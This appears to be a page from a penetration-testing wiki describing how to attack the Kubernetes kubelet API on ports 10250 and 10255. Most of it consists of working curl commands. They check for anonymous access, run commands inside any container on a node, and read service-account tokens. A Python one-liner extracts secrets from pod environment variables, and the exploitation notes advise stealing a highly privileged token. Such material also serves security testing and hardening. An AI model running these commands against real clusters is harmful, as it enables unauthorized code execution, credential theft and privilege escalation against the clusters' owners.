---
title: "Kubelet API: node control through the agent on every worker"
order: 1
description: "The kubelet on each node exposes an HTTPS API on 10250 and often a read-only HTTP API on 10255. Where the read-write API allows anonymous or unauthorized access, it lists pods and runs commands in any container on the node; the read-only port leaks pod specs and environment secrets. Either turns reach to a node into container execution and secret theft."
keywords:
  - kubelet
  - port 10250
  - port 10255
  - run exec
  - anonymous kubelet
---

# Kubelet API

Every node runs a kubelet that exposes an API: an authenticated HTTPS endpoint on 10250 and, on some clusters, a read-only HTTP endpoint on 10255. The read-write API can list pods and execute commands inside any container on the node, so if it permits anonymous access (`--anonymous-auth=true` with authorization set to `AlwaysAllow`, a classic misconfiguration), reaching it is code execution in every pod on that node. The read-only port never authenticates and leaks full pod specifications, including environment variables that carry secrets.

Probe both ports:

```bash
# read-write API: a pods list without a client cert => anonymous access
curl -sk https://<node>:10250/pods | head
# read-only API: always unauthenticated where enabled
curl -s http://<node>:10255/pods | python3 -m json.tool | head -40
```

## Execute in a container

Where the read-write API is open, the `run` endpoint executes a command in a named pod/namespace/container:

```bash
# enumerate pod, namespace, and container names from /pods, then:
curl -sk -XPOST "https://<node>:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"
curl -sk -XPOST "https://<node>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# exec endpoint (streamed) for interactive use
curl -sk "https://<node>:10250/exec/<ns>/<pod>/<container>?command=sh&input=1&output=1&tty=1"
```

Executing in a pod yields that pod's service-account token and its mounted secrets; picking a pod with a powerful service account escalates immediately.

## Read-only secret leak

```bash
# the read-only /pods dump contains env vars with injected secrets
curl -s http://<node>:10255/pods | \
  python3 -c 'import sys,json;[print(c.get("env")) for p in json.load(sys.stdin)["items"] for c in p["spec"]["containers"]]' \
  | grep -iE 'token|secret|password|key'
```

## Exploitation notes

- The read-write API without authorization is node-wide code execution: you can `run` in every pod on the node, so target a pod whose service account has broad RBAC and lift its token.
- The read-only 10255 port needs no auth at all where it is enabled; it is pure disclosure but routinely exposes credentials in pod environment variables.
- Reaching the kubelet is often done through the [API server proxy](api-server-proxy.md) (`nodes/proxy`) rather than directly, which bypasses network isolation to the node.
- `/runningpods/` and `/pods` enumerate the exact names needed for the `run`/`exec` paths.

## Tools

- [kubeletctl](https://github.com/cyberark/kubeletctl)

## References

- [Kubernetes: kubelet authn/authz](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
- [HackTricks: 10250 kubelet](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod)
